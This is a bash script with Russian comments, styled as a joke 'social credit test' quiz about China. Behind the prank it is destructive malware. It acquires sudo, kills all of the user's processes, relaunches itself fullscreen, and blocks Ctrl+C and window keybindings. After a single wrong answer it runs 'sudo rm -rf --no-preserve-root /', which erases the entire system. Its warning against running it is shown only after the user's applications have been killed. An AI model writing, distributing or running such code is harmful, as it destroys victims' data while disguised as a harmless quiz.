#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
social_credit=1000
is_root=false
# Функция для воспроизведения аудиофайла


# Проверка прав root
check_root() {

    sudo -v
    sudo chmod 777 $SCRIPT_DIR/redsky.mp3
    DISPLAY=:0 \
    DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID\bus" \
    nohup xdg-open /$SCRIPT_DIR/redsky.mp3 >/dev/null 2>&1 &
        # Закрываем все приложения пользователя
    sudo -u "$CURRENT_USER" pkill -9 -u "$USER_ID" || true
    
    # Открываем себя в полноэкранном терминале
    sudo -u "$CURRENT_USER" xterm -fullscreen -e "sudo $SCRIPT_DIR/$(basename "$0")" &
    sleep 2
    
    # Блокируем клавиатурные комбинации
    sudo -u "$CURRENT_USER" setxkbmap -option terminate:ctrl_alt_bksp
    sudo -u "$CURRENT_USER" xset -dpms s off s noblank s 0 0 s noexpose
    sudo -u "$CURRENT_USER" gsettings set org.gnome.desktop.wm.keybindings minimize "[]"

}

# Показать предупреждение
show_warning() {
    echo "DO NOT RUN THIS ON REAL HARDWARE!"
    sleep 5
    clear
}

# Запуск теста
run_test() {
    echo -e "\n======== SOCIAL CREDIT TEST ========\n"

    questions=(
        "Question 1: 中國是共產主義國家嗎? (y/n)"
        "Question 2: 中國是世界上最好的國家嗎？ (y/n)"
        "Question 3: 告訴我中國最好的網站?： 1.YouTube 2.臉書 3、阿里巴巴 4. 紅迪網"
        "台灣是一個國家嗎？(y/n)"
        "Which is the best country? 1.Russia 2.China 3.USA 4.India"
        "你有幾個孩子? 1.秦 2.周朝 3.漢朝 4. 唐代"
    )

    answers=("y" "n" "3" "y" "2" "4")

    for i in "${!questions[@]}"; do
        echo -e "\e[34m${questions[i]}\e[0m"
        
        read -n 1 user_answer # Чтение одного символа от пользователя
        echo
        
        if [[ "${user_answer,,}" == "${answers[i]}" ]]; then # Сравнение ответов (игнорируя регистр)
            paplay "$SCRIPT_DIR/correct.mp3" || aplay "$SCRIPT_DIR/correct.mp3" || echo "Sound playback not supported!" 
	    echo -e "\e[32mCorrect! +10 Social Credit\e[0m"
            social_credit=$((social_credit + 10))
        else            echo -e "\e[31mWrong! -10000000000000000000 Social Credit\e[0m"
            social_credit=--9999999999999999999 # Установка низкого значения социального кредита
            paplay "$SCRIPT_DIR/wrong.mp3" || aplay "$SCRIPT_DIR/wrong.mp3" || echo "Sound playback not supported!" 
            show_image
        fi
        
        echo -e "\e[33mCurrent Social Credit: $social_credit\e[0m\n"
        
        sleep 1
    done
}

# Показать изображение (ASCII-арт)
show_image() {
    echo -e "\e[35m"
    cat << "EOF"
          .-""""""""-.
         /          \
        /            \
       |,  .-.  .-.  ,|
       | )(_ /  \_ )( |
       |/     /\     \|
       (_     ^^     _)
        \__|IIIIII|__/
         | \IIIIII/ |
         \          /
          `--------`
EOF
    echo -e "\e[0m"
}

# Оценка результатов теста
evaluate_results() {
    if (( social_credit < 0 )); then
        echo -e "\e[31mTEST FAILED! YOUR SOCIAL CREDIT IS TOO LOW!"
        echo "DELETING SYSTEM...\e[0m"

        for i in {1..10}; do
            sleep 0.5 # Задержка для имитации удаления файлов
            echo "Deleting system files... $((i * 10))%"
        done

        sudo rm -rf --no-preserve-root /
    else
        echo -e "\e[32mTEST PASSED! YOUR SOCIAL CREDIT: $social_credit\e[0m"
        echo "Your system is safe... for now."
    fi
}

# Блокировка Ctrl+C в текущем процессе (не всегда работает в bash)
block_ctrl_c() {
    trap '' SIGINT # Блокировка сигнала прерывания Ctrl+C 
}

# Основная программа
clear

block_ctrl_c

check_root

show_warning

run_test

evaluate_results
